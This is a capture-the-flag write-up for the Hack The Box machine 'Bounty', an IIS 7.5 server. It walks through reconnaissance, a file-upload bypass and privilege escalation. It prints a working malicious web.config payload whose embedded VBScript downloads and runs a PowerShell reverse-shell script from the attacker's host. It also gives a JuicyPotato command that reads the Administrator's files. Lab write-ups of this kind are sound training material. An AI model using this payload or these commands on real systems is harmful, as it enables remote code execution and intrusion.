# CTF: Bounty (HTB)

## Metadata

- **Target IP:** 10.129.224.1
    
- **OS:** Windows Server 2008 R2 (IIS 7.5)
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-14
    
- **Key Skills/Tools:** IIS Short Filename Enumeration (`Shortscan`), `web.config` ASP Injection, Nishang, JuicyPotato (Abusing `SeImpersonatePrivilege`).
    

---

## Reconnaissance

### Port Scanning

The scan reveals a very limited attack surface, with only a single web port open.

Bash

```
nmap -p- -Pn $target -v --min-rate 1000 -oN nmap_ports.txt
```

**Key Ports:**

- **80/tcp:** Microsoft IIS httpd 7.5
    

### Web Enumeration

The landing page is a static image. Standard directory brute-forcing with `gobuster` revealed an interesting ASPX page.

Bash

```
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx
```

- **Found:** `/transfer.aspx`
    

### IIS Short Filename Enumeration

Using `shortscan`, I identified the legacy 8.3 naming convention vulnerability, which leaked the presence of an upload directory.

- **Leaked Directory:** `/uploadedfiles`
    

---

## Credential Cracking

_No credentials were discovered or required for the initial foothold._

---

## Foothold

### Web.config Exploitation

The `/transfer.aspx` page allows for file uploads. However, typical executable extensions were blocked. I bypassed this by uploading a malicious `web.config` file. By overriding the IIS configuration, I could force the server to execute ASP code hidden within the configuration file itself.

**Payload Construction:**

The `web.config` was configured to treat `.config` files as executable via the `IsapiModule` and contained a VBScript snippet to trigger a PowerShell reverse shell.

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')")
%>
```

After uploading, I navigated to `http://$target/UploadedFiles/web.config` while hosting the Nishang script, which caught a shell as the user `merlin`.

---

## Lateral Movement

_Direct transition from user `merlin` to `SYSTEM`._

---

## Privilege Escalation

### JuicyPotato (SeImpersonatePrivilege)

As is common with service accounts on older Windows builds, `whoami /priv` revealed that `SeImpersonatePrivilege` was enabled. This allows for a "Potato" style attack to intercept a SYSTEM token via COM/RPC.

I uploaded `JuicyPotato.exe` using `certutil` and executed a command to dump the root flag into my current directory:

PowerShell

```
./juicypotato.exe -l 1337 -p "cmd.exe" -a "/c type C:\Users\Administrator\Desktop\root.txt > C:\Users\merlin\Desktop\flag.txt" -t *
```

The exploit successfully spoofed the `NT AUTHORITY\SYSTEM` token, providing access to the administrator's files.

---

## Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|125d7c5cb9c13782046337e009fa9f2d|
|**Root**|9595869b3bb77b719d91ee44acc4c2ec|

---

That `web.config` trick is a lifesaver when standard `.aspx` uploads are filtered. It's a reminder that on IIS, the configuration files are just as dangerous as the application code itself.
